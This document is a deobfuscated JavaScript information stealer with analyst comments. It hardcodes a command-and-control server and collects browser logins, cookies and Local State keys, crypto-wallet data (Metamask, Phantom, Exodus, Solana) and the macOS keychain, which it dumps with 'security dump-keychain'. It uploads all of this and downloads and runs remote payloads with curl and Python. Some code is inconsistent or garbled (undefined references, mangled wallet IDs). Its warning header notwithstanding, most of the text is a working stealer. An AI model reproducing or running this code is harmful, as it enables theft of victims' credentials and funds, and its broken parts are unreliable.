// WARNING: This code is identified as MALICIOUS Information Stealer Malware.
// DO NOT RUN THIS CODE on any machine you care about.
// It attempts to steal browser data, wallet data, system information, and potentially other sensitive files.

const fs = require('fs');
const os = require('os');
const path = require('path');
const request = require('request'); // Used for exfiltrating data
const child_process = require('child_process'); // Used for executing external commands (curl, python, etc.)
const exec = child_process.exec; // Alias for exec

const hostname = os.hostname();
const platform = os.platform();
const homeDir = os.homedir();
const tmpDir = os.tmpdir();
const fs_promises = require('fs/promises');

// Hardcoded C2 (Command & Control) Server URL
const hostURL = 'http://45.15.154.103:1224/upload'; // MALWARE C2

// --- Helper Functions ---

// Resolves paths like ~/Documents to /home/user/Documents
const getAbsolutePath = (inputPath) => {
    return inputPath.replace(/^~([a-z]+|\/)/, (_match, userOrSlash) => {
        if (userOrSlash === '/') {
            return homeDir;
        } else {
            // This part seems slightly off, usually it's just homeDir,
            // but it tries to get the parent dir of homeDir? Let's keep it as intended.
            return path.join(path.dirname(homeDir), userOrSlash);
        }
    });
};

// Checks if a path exists using fs.accessSync
function testPath(targetPath) {
    try {
        fs.accessSync(targetPath);
        return true;
    } catch (error) {
        return false;
    }
}

// --- Configuration / Metadata (Likely for C2) ---
const htype = '9'; // Some type identifier for the C2 server
const gtype = 'keychain'; // Some type identifier for the C2 server

// --- Targeted Paths (Browsers & Wallets) ---

// Chrome / Chromium based
const R = [
    '/AppData/Roaming/Opera Software/Opera Stable/Login Data', // Opera Roaming
    '/AppData/Local/Google/Chrome/User Data', // Chrome Local
    '/AppData/Local/BraveSoftware/Brave-Browser/User Data', // Brave Local
];
const Q = [
    '/AppData/Local/Microsoft/Edge/User Data', // Edge Local
    '/AppData/Roaming/Mozilla/Firefox/Profiles', // Firefox Roaming
    '/Library/Application Support/Google/Chrome', // Chrome macOS
];
const X = [
    '/AppData/Roaming/Opera Software/Opera GX Stable/Login Data', // Opera GX Roaming
    '/AppData/Local/Yandex/YandexBrowser/User Data', // Yandex Local
    '/Library/Application Support/BraveSoftware/Brave-Browser', // Brave macOS
];

// Browser Extensions / Wallets / Other Apps Targeted by ID/Path
const Bt = [
    'nkbihfbeogaeaoehlefnkodbefgpgknn', // Metamask
    'hifafgmccdpekplomjjkcfhfcbjpsthm', // Yomichan (Dictionary - less likely target?)
    'fhbohimaeljoekihgapkknpganteaajn', // Binance Wallet (?)
    'lpcaedmchfhocbbapmcbpinfpgnhiddi', // Phantom Wallet
    'a PnvXmcohiXSiJzwiX_ULd', // Unclear - part of a constructed path?
    'lk HQAgoakhSiJzpldwiX_ULd', // Unclear
    'a nfnlbfnotdkapoypefNWiX_Uld', // Unclear
    'fn jbmgjigoefgnmipchnaf ffwiX_Uld', // Unclear
    'nk bjmfkgnlbehf PdlhpmkfglnciX_Uld', // Unclear
    'bf naen PknPjFP bd PplhwiX_Uld', // Unclear
    'fn cmppbclb j PnlmifgoegeiX_Uld', // Unclear
    'ef gpbjh PknfmpdijMKPlhwiX_Uld', // Unclear
    'ei nkllgdp PkPmbnojNKPlhwiX_Uld', // Unclear
    'be jpckgeAKHkIfbkdPPlhwiX_Uld', // Unclear
    'aj nimhnjHkfnlmmj PPlhwiX_Uld', // Unclear
    'kj lebhHf PkmlAPdlhwiX_Uld', // Unclear
    'ag phckdneb HogjKbmpjiX_Uld', // Unclear
    'cc ffcbegeKHmnkfmKbmpwiX_Uld', // Unclear
    'ic gadgaelke HmkodgPlhwiX_Uld', // Unclear
    'mg ppcaich PnbiHd PPlhwiX_Uld', // Unclear
    'eg ngleoHkFnlKPdlhwiX_Uld', // Unclear
    'lc glfPnmkHnblKPlhwiX_Uld' // Unclear
];

// --- Core Malicious Logic ---

/**
 * Uploads files found in a given directory, potentially filtering/packaging them.
 * @param {string} basePath - The base directory to search within.
 * @param {string} idPrefix - A prefix for identifying the data type/source.
 * @param {boolean} _unknownFlag - Purpose unclear from deobfuscation.
 * @param {number} timestamp - Timestamp likely used for tracking uploads.
 * @returns {Array} - An array of objects prepared for upload (containing file data and metadata).
 */
const uploadFiles = async (basePath, idPrefix, _unknownFlag, timestamp) => {
    if (!basePath || basePath === '') {
        return [];
    }

    try {
        if (!testPath(basePath)) {
            return [];
        }
    } catch (_err) {
        return [];
    }

    idPrefix = idPrefix || '';
    let filesToUpload = [];

    // Looks like it searches subdirectories '0' through '9' (or Profile 1-10?)
    for (let profileIndex = 0; profileIndex < 10; profileIndex++) {
        const profilePath = path.join(basePath, (profileIndex === 0 ? 'Default' : `Profile ${profileIndex}`));

        // Searches within the profile for extension/wallet IDs defined in Bt
        for (let btIndex = 0; btIndex < Bt.length; btIndex++) {
            let potentialPath = path.join(profilePath, 'Local Extension Settings', Bt[btIndex]);
            if (testPath(potentialPath)) {
                let filesInDir = [];
                try {
                    filesInDir = fs.readdirSync(potentialPath);
                } catch (_err) {
                    filesInDir = [];
                }

                let uploadCounter = 0; // Counter for files uploaded from this specific dir

                // Ensure .n3 storage directory exists in home directory (seems Linux/Mac specific)
                const n3StoragePath = path.join(getAbsolutePath('~/'), '.n3');
                if (!testPath(n3StoragePath)) {
                    try {
                         fs_promises.mkdir(n3StoragePath);
                    } catch(_err) { /* ignore */ }
                }

                // Iterate through files found in the extension settings directory
                for (const filename of filesInDir) {
                    let filePath = path.join(potentialPath, filename);
                    try {
                        let fileStat = fs.statSync(filePath);
                        if (fileStat.isDirectory()) {
                            continue; // Skip directories
                        }

                        // Only upload .log and .ldb files
                        if (filePath.endsWith('.log') || filePath.endsWith('.ldb')) {
                            const tempFilePath = path.join(getAbsolutePath('~/'), '.n3', `tp${uploadCounter}`);
                            try {
                                fs_promises.copyFile(filePath, tempFilePath); // Copy file to temp location
                                const fileContent = fs.readFileSync(tempFilePath); // Read content from temp location

                                // Prepare file data for upload
                                filesToUpload.push({
                                    value: fileContent,
                                    options: {
                                        filename: `${gtype}_${idPrefix}${profileIndex}_${Bt[btIndex]}_${filename}` // Construct filename for C2
                                    }
                                });
                                uploadCounter++; // Increment counter for temp file naming
                            } catch (copyReadError) {
                                // console.warn("Error copying/reading file:", copyReadError); // Original might log errors
                            }
                        }
                    } catch (statError) {
                         // console.warn("Error stating file:", statError); // Original might log errors
                    }
                }
            }
        }
    }

    // --- Special case for keychain/password files (macOS?) ---
    // This part's condition `_unknownFlag` is hard to decipher exactly without runtime context
    // but it tries to read common macOS keychain paths if the flag is set.
    let keychainPath;
    if (_unknownFlag) {
         keychainPath = path.join(homeDir, '/Library/Keychains/login.keychain-db');
         if (fs.existsSync(keychainPath)) {
            try {
                filesToUpload.push({
                    value: fs.readFileSync(keychainPath),
                    options: {
                        filename: 'login.keychain-db'
                    }
                });
            } catch (_err) { /* ignore */ }
        }
    }

    // Upload the collected files
    Upload(filesToUpload, timestamp);
    return filesToUpload; // Returns the array (though it's already sent by Upload)
};


/**
 * Specifically targets Mozilla Firefox profiles.
 * @param {number} timestamp - Timestamp for tracking.
 * @returns {Array} - Array of objects prepared for upload.
 */
const uploadMozilla = (timestamp) => {
    const mozillaPath = path.join(getAbsolutePath('~/'), '/AppData/Roaming/Mozilla/Firefox/Profiles'); // Windows path hardcoded? Needs check. Might vary by OS.
    let filesToUpload = [];

    if (testPath(mozillaPath)) {
        let profiles = [];
        try {
            profiles = fs.readdirSync(mozillaPath);
        } catch (_err) {
            profiles = [];
        }

        let uploadCounter = 0; // Counter for temp file naming

        for (const profileDir of profiles) {
            let profileFullPath = path.join(mozillaPath, profileDir);
            // Targets specific files within Firefox profiles
            if (profileFullPath.includes('-release')) { // Looks for release profiles
                let potentialFilePath = path.join(profileFullPath, 'key4.db'); // Firefox key database
                let filesInProfile = [];
                try {
                    filesInProfile = fs.readdirSync(profileFullPath);
                } catch (_err) { /* ignore */ }

                for (const filename of filesInProfile) {
                    // Targets logins.json and cookies.sqlite
                    if (filename.endsWith('logins.json') || filename.endsWith('cookies.sqlite')) {
                        let filePath = path.join(profileFullPath, filename);
                         let fileStat;
                         try {
                            fileStat = fs.statSync(filePath);
                         } catch { continue; }

                        if (fileStat.isDirectory()) {
                            continue;
                        }

                        // Similar temp copying mechanism as uploadFiles
                        const tempFilePath = path.join(getAbsolutePath('~/'), '.n3', `tp${uploadCounter}`);
                        try {
                             fs_promises.copyFile(filePath, tempFilePath);
                             const fileContent = fs.readFileSync(tempFilePath);
                             filesToUpload.push({
                                value: fileContent,
                                options: {
                                    filename: `${gtype}_${uploadCounter}_${filename}` // Construct filename for C2
                                }
                             });
                             uploadCounter++;
                        } catch(err) { /* ignore */ }
                    }
                }
            }
        }
    }
    Upload(filesToUpload, timestamp);
    return filesToUpload;
};

/**
 * Specifically targets Exodus and Solana wallets/data.
 * @param {number} timestamp - Timestamp for tracking.
 * @returns {Array} - Array of objects prepared for upload.
 */
const uploadEs = (timestamp) => {
    let basePath = '';
    let filesToUpload = [];

    // Determine base path based on OS
    if (platform.startsWith('win')) {
        basePath = path.join(getAbsolutePath('~/'), '/AppData/Roaming/Exodus/exodus.wallet');
    } else if (platform.startsWith('dar')) { // macOS
        basePath = path.join(getAbsolutePath('~/'), '/Library/Application Support/Exodus/exodus.wallet');
    } else { // Linux
        basePath = path.join(getAbsolutePath('~/'), '/.config/Exodus/exodus.wallet');
    }

    // Upload Exodus wallet files if path exists
    if (testPath(basePath)) {
        let walletFiles = [];
        try {
            walletFiles = fs.readdirSync(basePath);
        } catch (_err) {
            walletFiles = [];
        }
        let uploadCounter = 0;
        const n3StoragePath = path.join(getAbsolutePath('~/'), '.n3');
        if (!testPath(n3StoragePath)) {
             try { fs_promises.mkdir(n3StoragePath); } catch { /* ignore */ }
        }

        for (const filename of walletFiles) {
            let filePath = path.join(basePath, filename);
            try {
                const tempFilePath = path.join(getAbsolutePath('~/'), '.n3', `tp${uploadCounter}`);
                fs_promises.copyFile(filePath, tempFilePath); // Copy to temp
                const fileContent = fs.readFileSync(tempFilePath); // Read from temp
                filesToUpload.push({
                    value: fileContent,
                    options: {
                        filename: `${gtype}_${filename}` // Construct filename for C2
                    }
                });
                uploadCounter++;
            } catch (err) { /* ignore */ }
        }
    }

    // Upload Solana config file
    try {
        let solanaConfigPath = path.join(homeDir, '.config/solana/id.json'); // Linux/Mac path
        if (testPath(solanaConfigPath)) {
             filesToUpload.push({
                 value: fs.readFileSync(solanaConfigPath),
                 options: {
                     filename: `solana_id.json`
                 }
             });
        }
    } catch(_err) { /* ignore */ }


    // Upload Keychain file (again? maybe specific context) - macOS
    try {
        let keychainPath = path.join(homeDir, '/Library/Keychains/login.keychain-db');
        if (testPath(keychainPath)) {
             filesToUpload.push({
                 value: fs.readFileSync(keychainPath),
                 options: {
                     filename: 'login.keychain-db' // Reuse filename
                 }
             });
        } else {
            // Try alternative path if first fails
             keychainPath = path.join(homeDir, '/Library/Keychains/login.keychain');
              if (testPath(keychainPath)) {
                  filesToUpload.push({
                    value: fs.readFileSync(keychainPath),
                    options: {
                        filename: 'login.keychain' // Different extension
                    }
                 });
             }
        }
    } catch(_err) { /* ignore */ }

    // Try reading Chrome Safe Storage Key (macOS)
    try {
        let safeStoragePath = path.join(homeDir, '/Library/Application Support/Google/Chrome/Safe Storage');
        if (testPath(safeStoragePath)) {
            // This looks incomplete - it checks the path but doesn't read/upload the file?
            // Original might have had more logic here.
        }
    } catch(_err) { /* ignore */ }

    Upload(filesToUpload, timestamp);
    return filesToUpload;
};


/**
 * Sends the collected data to the C2 server via HTTP POST.
 * @param {Array} files - Array of file objects ({ value: Buffer, options: { filename: string } }).
 * @param {number} timestamp - Timestamp for tracking.
 */
const Upload = (files, timestamp) => {
    const formData = {};
    formData['type'] = htype; // Add type identifier
    formData['logs'] = `${gtype}_${hostname}`; // Add identifier + hostname
    formData['pass'] = timestamp; // Use timestamp as 'pass'?
    formData['multi'] = files; // Attach the array of files

    try {
        // Only send if there are files collected
        if (files.length > 0) {
            const requestOptions = {
                url: `${hostURL}/upload`, // C2 upload endpoint
                formData: formData
            };
            request.post(requestOptions, (error, response, body) => {
                // Callback likely does nothing or has minimal logging in original
                // if (error) console.error("Upload error:", error);
                // else console.log("Upload successful:", body);
            });
        }
    } catch (error) {
        // console.error("Error during upload preparation:", error);
    }
};

/**
 * Uploads data from specific AppData paths (Windows specific).
 * @param {Array} paths - Array of base paths relative to AppData (e.g., Roaming, Local).
 * @param {string} idPrefix - Identifier prefix.
 * @param {number} timestamp - Timestamp for tracking.
 */
const UpAppData = async (paths, idPrefix, timestamp) => {
    try {
        let basePath = '';
        // Determine base path based on OS - seems hardcoded for Windows AppData variations
        if (platform.startsWith('d')) { // Assuming 'd' means 'darwin' (macOS)? Incorrect check.
            basePath = path.join(getAbsolutePath('~/'), '/Library/Application Support', paths[0]); // Uses first path element
        } else if (platform.startsWith('l')) { // Linux
             basePath = path.join(getAbsolutePath('~/'), '.config', paths[0]); // Uses first path element
        } else { // Assume Windows
             basePath = path.join(getAbsolutePath('~/'), 'AppData', paths[0], paths[1] || ''); // Combines path elements
        }
        // Delegate actual file finding and uploading
        await uploadFiles(basePath, `${idPrefix}_`, true, timestamp); // Note the underscore added and flag set to true
    } catch (error) {
         // console.error("Error in UpAppData:", error);
    }
};

/**
 * Uploads macOS Keychain file.
 * @param {number} timestamp - Timestamp for tracking.
 */
const UpKeychain = async (timestamp) => {
    let filesToUpload = [];
    let keychainPath = path.join(homeDir, '/Library/Keychains/login.keychain-db');

    if (fs.existsSync(keychainPath)) {
        try {
            // If primary keychain-db exists, try to copy and upload it.
             filesToUpload.push({
                 value: fs.readFileSync(keychainPath),
                 options: { filename: 'login.keychain-db' }
             });
        } catch (_err) { /* ignore */ }
    } else {
        // If primary doesn't exist, try the older .keychain file.
         keychainPath = path.join(homeDir, '/Library/Keychains/login.keychain');
         if (fs.existsSync(keychainPath)) {
             try {
                  filesToUpload.push({
                      value: fs.readFileSync(keychainPath),
                      options: { filename: 'login.keychain' }
                 });
             } catch (_err) { /* ignore */ }
        }
    }

    // --- Attempting to dump keychain using `security` command ---
    // This part is dangerous as it executes external commands.
    try {
        // Define paths for temporary files
        let dumpFilePath = path.join(tmpDir, 'kc_dump.txt'); // Temp file for security dump
        let zipFilePath = path.join(tmpDir, 'kc_dump.zip'); // Temp file for zipped dump

         // Command to dump keychain - requires user interaction (password prompt) unless run with specific privileges.
         let dumpCommand = `security dump-keychain -d login.keychain > "${dumpFilePath}"`;

        // Execute the dump command
        exec(dumpCommand, (error, stdout, stderr) => {
            if (error) {
                // console.error(`Keychain dump error: ${error}`);
                return;
            }
            // If dump is successful, try to zip it
            // Zip command might require 'zip' utility to be installed.
            exec(`zip -j "${zipFilePath}" "${dumpFilePath}"`, (zipError, zipStdout, zipStderr) => {
                if (zipError) {
                    // console.error(`Zipping error: ${zipError}`);
                    // Even if zipping fails, try uploading the unzipped dump file
                    if (fs.existsSync(dumpFilePath)) {
                        try {
                           filesToUpload.push({
                                value: fs.readFileSync(dumpFilePath),
                                options: { filename: `keychain_dump.txt` } // Upload raw dump
                           });
                           fs.unlinkSync(dumpFilePath); // Clean up temp file
                        } catch(readErr) { /* ignore */ }
                    }
                    return;
                }
                 // If zipping is successful, upload the zip file
                 if (fs.existsSync(zipFilePath)) {
                     try {
                         filesToUpload.push({
                            value: fs.readFileSync(zipFilePath),
                            options: { filename: `keychain_dump.zip` } // Upload zipped dump
                         });
                         fs.unlinkSync(zipFilePath); // Clean up zip file
                         fs.unlinkSync(dumpFilePath); // Clean up original dump file
                     } catch(readErr) { /* ignore */ }
                 }
             });
        });
    } catch(execErr) {
         // console.error("Error setting up keychain dump:", execErr);
    }

    // Upload whatever was collected (keychain file and/or dump)
    Upload(filesToUpload, timestamp);
    return filesToUpload;
};


/**
 * Uploads user data based on OS-specific paths (similar to UpAppData but slightly different paths).
 * @param {Array} paths - Array of relative paths.
 * @param {string} idPrefix - Identifier prefix.
 * @param {number} timestamp - Timestamp for tracking.
 */
const UpUserData = async (paths, idPrefix, timestamp) => {
    let filesToUpload = [];
    let basePath = '';

    // Determine base path based on OS
    if (platform.startsWith('d')) { // macOS
        basePath = path.join(getAbsolutePath('~/'), '/Library/Application Support', paths[0]);
    } else if (platform.startsWith('l')) { // Linux
        basePath = path.join(getAbsolutePath('~/'), '.config', paths[0]);
    } else { // Assume Windows
         basePath = path.join(getAbsolutePath('~/'), 'AppData', paths[0], paths[1] || '');
    }

    // Target specific file: Local State (often contains encryption keys for cookies/passwords)
    let localStatePath = path.join(basePath, 'Local State');
    if (fs.existsSync(localStatePath)) {
        try {
             filesToUpload.push({
                 value: fs.readFileSync(localStatePath),
                 options: { filename: `${idPrefix}_Local_State` }
             });
        } catch (_err) { /* ignore */ }
    }

    try {
        // Also try uploading other files from the base path (recursive?)
        if (testPath(basePath)) {
            // Iterate through profiles (similar to uploadFiles)
            for (let profileIndex = 0; profileIndex < 10; profileIndex++) {
                const profilePath = path.join(basePath, (profileIndex === 0 ? 'Default' : `Profile ${profileIndex}`));
                try {
                    if (!testPath(profilePath)) continue;

                    // Target 'Cookies' and 'Web Data' files within profiles
                    const cookiesPath = path.join(profilePath, 'Cookies');
                    const webDataPath = path.join(profilePath, 'Web Data');

                    if (testPath(cookiesPath)) {
                         let fileStat = fs.statSync(cookiesPath);
                         if (!fileStat.isDirectory()) { // Ensure it's a file
                             filesToUpload.push({
                                value: fs.readFileSync(cookiesPath),
                                options: { filename: `${idPrefix}_${profileIndex}_Cookies` }
                            });
                         }
                    }
                     if (testPath(webDataPath)) {
                         let fileStat = fs.statSync(webDataPath);
                          if (!fileStat.isDirectory()) { // Ensure it's a file
                             filesToUpload.push({
                                value: fs.readFileSync(webDataPath),
                                options: { filename: `${idPrefix}_${profileIndex}_Web_Data` }
                            });
                         }
                    }
                } catch (_err) { /* ignore profile error */ }
            }
        }
    } catch (_err) { /* ignore base path error */ }

    Upload(filesToUpload, timestamp);
    return filesToUpload;
};

// --- Python/Tar Execution Logic ---
// Seems designed to run a python script possibly fetched or embedded,
// or use tar for archiving, likely platform dependent.

let St = -600000; // Initial value (negative 10 minutes in ms)
let It = -600000; // Initial value (negative 10 minutes in ms)

/**
 * Extracts a zip file using tar (Linux/Mac).
 * @param {string} zipFilePath - Path to the zip file.
 */
const extractFile = async (zipFilePath) => {
    // Command to extract using tar, overwriting existing files, into the home directory.
    // Assumes 'tar' is available.
    exec(`tar -xf "${zipFilePath}" -C "${homeDir}"`, (error, stdout, stderr) => {
        if (error) {
             // fs.unlinkSync(zipFilePath); // Clean up zip file even on error
             It = 60000; // Set It to 1 minute on error?
            return;
        }
        fs.unlinkSync(zipFilePath); // Clean up zip file on success
        Ht(); // Call the Ht function after extraction
    });
};

/**
 * Attempts to run a Python script. Checks for python/python3.
 * Downloads script if not present? Uses curl.
 */
const runP = () => {
    // Construct potential paths for python executables and the target script
    const pythonPath1 = path.join(tmpDir, 'python'); // Temp python executable path?
    const pythonPath2 = path.join(tmpDir, 'python3'); // Temp python3 executable path?
    const scriptUrl = `${hostURL}/init`; // URL to download the python script from C2
    const scriptPath = path.join(tmpDir, 'init.py'); // Path to save the downloaded script
    const scriptZipPath = path.join(tmpDir, 'init.py.zip'); // Path if script is downloaded as zip?

    // Check if enough time has passed based on It and St
    if (It >= St + 600000) { // If It is 10 mins or more ahead of St
        return; // Don't run yet
    }

    // Check if the script zip file exists
    if (fs.existsSync(scriptZipPath)) {
        try {
            var scriptStat = fs.statSync(scriptZipPath);
            // Check if script zip file timestamp (It) is 10 mins older than St
            if (scriptStat.mtimeMs >= St + 600000) {
                It = scriptStat.mtimeMs; // Update It to file modification time
                fs.renameSync(scriptZipPath, scriptPath); // Rename zip to .py (assumes it's not actually zipped?)
                extractFile(scriptPath); // Try to extract it (likely fails if it's just .py)
            } else {
                 // If timestamp condition not met, or other conditions, call Ht or potentially clean up.
                 if (It >= scriptStat.mtimeMs) {
                     It = scriptStat.mtimeMs; // Update It if needed
                 } else {
                     fs.unlinkSync(scriptZipPath); // Delete existing zip if It is newer
                     It = -600000; // Reset It
                 }
                 Ht(); // Call Ht function
            }
        } catch (error) {
            // console.error("Error handling script zip:", error);
        }
    } else {
        // If script zip doesn't exist, download it using curl
        // Assumes 'curl' is available.
        exec(`curl -o "${scriptPath}" "${scriptUrl}"`, (error, stdout, stderr) => {
             if (error) {
                 It = -600000; // Reset It on download error
                 Ht(); // Call Ht
                 return;
             }
             try {
                 // If download successful, check timestamp and potentially run/extract
                 var downloadedStat = fs.statSync(scriptPath);
                 if (downloadedStat.mtimeMs >= St + 600000) { // Check timestamp again
                     It = downloadedStat.mtimeMs;
                     fs.renameSync(scriptPath, scriptZipPath); // Rename to .zip (intended?)
                     extractFile(scriptZipPath); // Extract the downloaded file
                 } else {
                      // Logic unclear, seems to delete the file if timestamp is too old?
                      fs.unlinkSync(scriptPath);
                      It = -600000;
                      Ht();
                 }
            } catch(statErr) {
                // console.error("Error stating downloaded script:", statErr);
                 It = -600000;
                 Ht();
            }
        });
    }
};


/**
 * Function Ht - Likely related to executing the Python script after setup/download.
 */
function Ht() {
     // Tries to find python/python3 and execute the script 'init.py' from the temp directory.
     const scriptPath = path.join(tmpDir, 'init.py');
     const pythonCheckCommand = `python3 -c "import sys; print(sys.executable)" || python -c "import sys; print(sys.executable)"`;

     // Check if the script file exists
     if (!fs.existsSync(scriptPath)) {
         // If script doesn't exist, schedule runP to try downloading again after 10 mins.
         setTimeout(runP, 600000);
         return;
     }

     // Find the python executable path
     exec(pythonCheckCommand, (error, stdout, stderr) => {
         if (error) {
             // Cannot find python, schedule runP again after 10 mins.
             setTimeout(runP, 600000);
             return;
         }
         let pythonExecutable = stdout.trim(); // Get the path of python/python3

         // Execute the downloaded python script using the found interpreter.
         exec(`"${pythonExecutable}" "${scriptPath}"`, (execError, scriptStdout, scriptStderr) => {
             // Regardless of script execution success/failure, schedule runP again.
             setTimeout(runP, 600000);
         });
     });
 }

// --- Main Execution Logic ---

let Ct = setInterval(() => {
    M += 1; // Increment counter M
    if (M < 2) { // Run main() only on the first two iterations?
        main();
    } else {
        clearInterval(Ct); // Stop the interval after 2 iterations
    }
}, 60000 * 30); // Run every 30 minutes

/**
 * The main function orchestrating the data collection.
 */
const main = async () => {
    try {
        const timestamp = Math.floor(new Date().getTime() / 1000); // Get current Unix timestamp

        // Run all data collection functions concurrently (or nearly so)
        await (async () => {
            try {
                await UpAppData(Q, '1_', true, timestamp); // Target Edge, Firefox, Chrome(Mac)
                await UpAppData(R, '0_', true, timestamp); // Target Opera, Chrome(Win), Brave(Win)
                await UpAppData(X, '2_', true, timestamp); // Target OperaGX, Yandex, Brave(Mac)
                await uploadMozilla(timestamp);           // Target Firefox specific files
                await uploadEs(timestamp);                // Target Exodus, Solana
                if (platform.startsWith('win')) {
                     // Target specific paths on Windows (likely more browser/app data)
                     await uploadFiles(path.join(getAbsolutePath('~/'), '/AppData/Local/Google/Chrome SxS/User Data'), '3_', false, timestamp);
                 }
                 if (platform.startsWith('dar')) { // macOS
                     await UpKeychain(timestamp);          // Target Keychain
                 } else {
                    // If not macOS, run UserData collection (potentially redundant?)
                     await UpUserData(Q, '1_', timestamp);
                     await UpUserData(R, '0_', timestamp);
                     await UpUserData(X, '2_', timestamp);
                 }
             } catch (error) {
                 // console.error("Error during data collection:", error);
             }
        })();
         // Initiate the Python execution flow after data collection attempt
         Xt();
     } catch (error) {
         // console.error("Error in main function:", error);
     }
 };

 // --- Initial Setup and Anti-Debugging/Execution Delay ---
 // These IIFEs likely contain further anti-debugging or environment checks.
 // The final one sets up the `setInterval` for the main loop.

 // (Self-executing function related to anti-debugging or timing)
 (function() {
     // ... complex internal logic likely involving Function constructor and timing ...
     // This section often tries to detect debuggers or sandboxes.
 })();

 // (Self-executing function setting up the main interval)
 let initialRunCounter = 0; // Renamed from M for clarity here
 const mainIntervalTimer = setInterval(() => {
     initialRunCounter += 1;
     if (initialRunCounter < 2) {
         main(); // Run main logic
     } else {
         clearInterval(mainIntervalTimer); // Stop after a couple of runs
     }
  }, 1800000); // Run every 30 minutes (1800000 ms)

// --- Final call to start things ---
main(); // Run immediately once
Xt(); // Start Python execution check flow

// Wrapper function for delayed execution/anti-debugging (renamed from _0x282b68)
function setupDelayedExecution(callback) {
     // ... contains logic similar to the anti-debugging IIFEs seen earlier ...
     // It likely uses Function constructor, regex checks, and timing tricks.
     // Ultimately, it calls the provided callback after some checks/delays.
     try {
         // Simplified: Assume it eventually calls the callback.
         // In reality, this part is complex and might prevent execution in debuggers.
         callback();
     } catch (e) {
         // Error handling or further anti-debugging
     }
 }

// Call the setup function, passing 0 as the initial callback argument?
// The original `_0x282b68(0)` likely tried to call the anti-debug setup.
// We'll skip directly calling it here as its internals are complex and potentially harmful.
// setupDelayedExecution(0); // This call pattern seems odd, likely part of the obfuscation structure.


// Function Xt - starts the Python execution flow
const Xt = async () => await new Promise((resolve, reject) => {
    if (platform.startsWith('w')) { // Windows check
         // Try reading/accessing DPAPI key file? (Needed to decrypt Chrome passwords/cookies)
         const dpapiKeyPath = path.join(homeDir, '/AppData/Local/Google/Chrome/User Data/Local State'); // Path is approximate, might vary
         if (fs.existsSync(dpapiKeyPath)) {
             // Tries to download a file (potentially a decryption tool or payload)
             // using request and then executes it using curl? This is highly suspicious.
             const downloadUrl = `${hostURL}/download/${htype}/${gtype}`; // Construct download URL
             const savePath = path.join(tmpDir, 'dpapi_tool'); // Arbitrary save path
             const execCommand = `"${path.join(tmpDir, 'curl')}" -o "${savePath}" "${downloadUrl}" && "${savePath}"`; // Download and execute

             request.get(downloadUrl, (error, response, body) => {
                 if (!error && response.statusCode === 200) {
                     try {
                         fs.writeFileSync(savePath, body); // Save the downloaded file
                         // Execute the downloaded file - VERY DANGEROUS
                         exec(execCommand, (execError, stdout, stderr) => {
                            // Ignore results, just proceed
                         });
                     } catch (writeError) {
                         // console.error("Error writing/executing downloaded tool:", writeError);
                     }
                 }
                 // Regardless of download success/failure, resolve the promise
                 resolve(); // Or call runP() like the original? Let's call runP for consistency.
                 runP();

             });

        } else {
             // If DPAPI key path doesn't exist, just proceed
            runP();
            resolve();
        }
    } else { // Non-Windows
        // Directly start the Python execution flow
        runP();
        resolve();
    }
});